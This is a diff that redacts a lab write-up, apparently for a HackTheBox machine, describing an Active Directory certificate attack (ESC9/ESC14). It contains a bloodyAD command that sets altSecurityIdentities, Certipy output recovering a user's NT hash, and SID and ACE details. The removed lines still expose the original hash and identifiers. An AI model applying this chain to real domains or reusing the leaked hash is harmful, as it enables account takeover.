@@ -66,7 +66,7 @@ The successful authentication output confirmed:
 The recovered NT hash was:
 
 ```
-fe92aaf479e32cb0e9c40a929c8212b8
+REDACTED 
 ```
 
 This demonstrated successful compromise of Toby Ellis's domain identity.
@@ -108,7 +108,7 @@ The main investigation was conducted from:
 ~/HTB/Handler/cert
 ```
 
-The system was running CachyOS/Arch Linux.
+The system was running  Linux.
 
 ---
 
@@ -444,7 +444,7 @@ Observed result:
 ```
 subject=CN=Wei Zhang (adm)
 issuer=DC=htb, DC=htb-airways, CN=htb-airways-DC01-CA
-serial=1800000011791C80644A7DE910000100000011
+serial=180(REDACTED)
 notBefore=Nov 23 10:28:05 2026 GMT
 notAfter=Nov 23 10:28:05 2027 GMT
 X509v3 Extended Key Usage:
@@ -474,13 +474,13 @@ openssl x509 -noout -ext subjectKeyIdentifier
 Observed value:
 
 ```
-C9:C0:67:39:EB:12:91:57:25:C8:AD:11:0B:4A:38:DA:76:DD:32:8B
+C9:REDACTED
 ```
 
 Compact SKI:
 
 ```
-C9C06739EB12915725C8AD110B4A38DA76DD328B
+C9.REACTED
 ```
 
 This value was used for explicit certificate mapping.
@@ -510,7 +510,7 @@ This allowed the newly issued certificate to be explicitly associated with Toby'
 Distinguished Name: CN=Toby Ellis,OU=Ground Operations,OU=Departments,DC=htb-airways,DC=htb
 SAM Account Name: t.ellis
 UPN: t.ellis@htb-airways.htb
-SID: S-1-5-21-2807179013-311950797-2107105437-5684
+SID: S-1.REDATED
 ```
 
 ### 9.3 Permission Analysis
@@ -522,8 +522,8 @@ The relevant ACE (ACE #4) had:
 ```
 ACE Type: 5 (ACCESS_ALLOWED_OBJECT_ACE)
 Access Mask: 0x30
-Trustee SID: S-1-5-21-2807179013-311950797-2107105437-5639 (w.zhang.adm)
-Object Type GUID: 00fbf30c-91fe-11d1-aebc-0000f80367c1
+Trustee SID: S-1.REDACTED (w.zhang.adm)
+Object Type GUID: 00REDACTED
 ```
 
 The access mask decomposed into:
@@ -555,7 +555,7 @@ bloodyAD \
 --host DC01.htb-airways.htb \
 -d htb-airways.htb \
 -k set object t.ellis altSecurityIdentities \
--v 'X509:<SKI>C9C06739EB12915725C8AD110B4A38DA76DD328B'
+-v 'X509:<SKI>C9REDACTED
 ```
 
 Observed result:
@@ -581,7 +581,7 @@ distinguishedName:
 CN=Toby Ellis,OU=Ground Operations,OU=Departments,DC=htb-airways,DC=htb
 
 altSecurityIdentities:
-X509:<SKI>C9C06739EB12915725C8AD110B4A38DA76DD328B
+X509:<SKI>C9REDACTED
 ```
 
 The LDAP readback confirmed that the mapping was stored correctly.
@@ -633,7 +633,6 @@ Certipy v5.1.0
 [*] Wrote credential cache to 't.ellis.ccache'
 [*] Trying to retrieve NT hash for 't.ellis'
 [*] Got hash for 't.ellis@htb-airways.htb':
-aad3b435b51404eeaad3b435b51404ee:fe92aaf479e32cb0e9c40a929c8212b8
 ```
 
 This was the decisive successful authentication result.
@@ -645,13 +644,13 @@ The message `No identities found in this certificate` did not prevent authentica
 The recovered NTLM hash was:
 
 ```
-fe92aaf479e32cb0e9c40a929c8212b8
+REDACTED
 ```
 
 Full LM:NT representation:
 
 ```
-aad3b435b51404eeaad3b435b51404ee:fe92aaf479e32cb0e9c40a929c8212b8
+aad3b435b51404eeaad3b435b51404ee:REDACTED
 ```
 
 **Credential handling warning:** The recovered hash is authentication material. It should be kept in restricted lab notes and not included in public write-ups unless redacted.
@@ -768,10 +767,10 @@ The parser returned 51 ACE entries. The critical finding was **ACE #4**:
 | ACE Number | 4 |
 | ACE Type | 5 (ACCESS_ALLOWED_OBJECT_ACE) |
 | ACE Classification | Access-allowed object ACE |
-| Trustee SID | `S-1-5-21-2807179013-311950797-2107105437-5639` |
+| Trustee SID | `S-1REDACTED` |
 | Trustee | `w.zhang.adm` |
 | Access Mask | `0x30` (Read Property + Write Property) |
-| Object Type GUID | `00fbf30c-91fe-11d1-aebc-0000f80367c1` |
+| Object Type GUID | `00fbREDACTEDc1` |
 | Attribute | `altSecurityIdentities` |
 
 This establishes a direct, attribute-specific ACE granting the compromised account modification rights over the certificate mapping attribute.
@@ -999,7 +998,7 @@ ESC9 Certificate Enrollment (Request ID 17)
 Certificate Issued to "Wei Zhang (adm)"
          |
          v
-SKI Extracted: C9C06739EB12915725C8AD110B4A38DA76DD328B
+SKI Extracted: C9CREDACTED
          |
          v
 altSecurityIdentities Write Permission Identified on t.ellis
@@ -1008,13 +1007,13 @@ altSecurityIdentities Write Permission Identified on t.ellis
 ESC14 SKI Mapping via BloodyAD
          |
          v
-X509:<SKI>C9C06739EB12915725C8AD110B4A38DA76DD328B
+X509:<SKI>C9C0REDACTED
          |
          v
 PKINIT as t.ellis (Kerberos TGT)
          |
          v
-Toby's NT Hash Recovered: fe92aaf479e32cb0e9c40a929c8212b8
+Toby's NT Hash Recovered: feREDACTED
          |
          v
 Internal DNS Discovery (SRV01 = 192.168.37.2)
